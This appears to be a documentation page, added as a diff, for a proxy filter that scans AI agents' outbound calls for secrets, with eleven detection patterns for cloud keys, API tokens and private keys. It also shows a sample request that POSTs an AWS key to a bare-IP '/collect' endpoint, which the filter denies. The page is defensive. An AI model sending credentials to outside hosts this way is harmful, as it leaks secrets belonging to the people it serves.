@@ -1,0 +1,86 @@
+---
+title: '11. DLP gate'
+description: 'Eleven high-confidence secret patterns on outbound calls only, banded by a single policy setting.'
+section: 'filters'
+order: 11
+tier: 'community'
+version: '0.3.1'
+lastUpdated: '2026-08-24'
+editUrl: 'https://github.com/grith-ai/grith-docs/edit/main/content/docs/filters/11-dlp-gate.mdx'
+---
+
+| | |
+| --- | --- |
+| **Phase** | 2, pattern |
+| **Score** | 1.0, 5.0 or 9.0 - set by `policy` |
+| **Source** | `crates/grith-proxy/src/filters/dlp_gate.rs` |
+| **Config** | `config/filters/dlp.toml` |
+
+The outbound-only counterpart to [secret-scan](/docs/filters/07-secret-credential-scanning).
+Where that filter runs a broad 1618-pattern corpus over every call, this one runs eleven
+deliberately conservative patterns over the four call types that can move data off the
+machine: `HttpRequest`, `NetConnect`, `ShellExec` and `ProcessSpawn`.
+
+## One setting decides the score
+
+| `policy` | Score | Effect at the default thresholds |
+| --- | --- | --- |
+| `redact_and_allow` | 1.0 | recorded, masked in the UI, allowed |
+| `queue_for_review` (default) | 5.0 | queues for a human decision |
+| `deny` | 9.0 | denies on its own |
+
+<ConfigExample title="config/filters/dlp.toml" code={`[dlp]
+enabled = true
+
+# redact_and_allow | queue_for_review | deny
+policy = "queue_for_review"
+`} />
+
+## The patterns
+
+| Label | Matches |
+| --- | --- |
+| `aws-key` | an `AKIA` access key ID |
+| `aws-secret` | an `aws_secret_access_key` assignment |
+| `github-token` | `ghp_` / `ghs_` tokens |
+| `github-pat` | a fine-grained `github_pat_` token |
+| `private-key` | a `-----BEGIN … PRIVATE KEY-----` header |
+| `openai-key` | an OpenAI `sk-…T3BlbkFJ…` key |
+| `anthropic-key` | an `sk-ant-api03-` key |
+| `stripe-key` | `sk_live_` / `sk_test_` |
+| `slack-token` | `xoxb-`, `xoxp-` and siblings |
+| `bearer-token` | a `Bearer` header value of 20 characters or more |
+| `url-credential` | `scheme://user:pass@host` |
+
+The first match wins and its label appears in the message. Add your own with
+`[[dlp.patterns]]` entries carrying `id`, `regex` and `label` - defining any patterns replaces
+the built-in eleven, so start from a copy.
+
+<Terminal>
+{`$ grith proxy test '{"type":"HttpRequest","method":"POST","url":"https://45.33.32.156/collect","arguments":{"body":"AKIAIOSFODNN7EXAMPLE"}}'
+
+  Score:       14.5
+  Decision:    DENY
+
+  Filter Breakdown:
+    + operation-risk         1.0  [notice]  HTTP POST request (carries body): https://45.33.32.156/collect
+    + secret-scan            5.0  [critical]  AWS access key ID detected
+    + egress-policy          3.5  [warning]  Unknown outbound destination from http_request: 45.33.32.156
+    + dlp-gate               5.0  [error]  Secret detected in outbound arguments [aws-key]: aws-access-key
+
+  Exit code:   2 (deny)`}
+</Terminal>
+
+Both filters firing on one credential is intended. They are calibrated together: a secret in
+an outbound argument is worth more than the same secret sitting in a local command line.
+
+## The redactor
+
+The compiled pattern set is shared with a redactor the daemon uses to mask matches in summaries
+and log output, so a secret that triggers this filter is not then printed in the record of it
+triggering.
+
+## See also
+
+- [7. Secret / credential scanning](/docs/filters/07-secret-credential-scanning)
+- [12. Canary detection](/docs/filters/12-canary-detection)
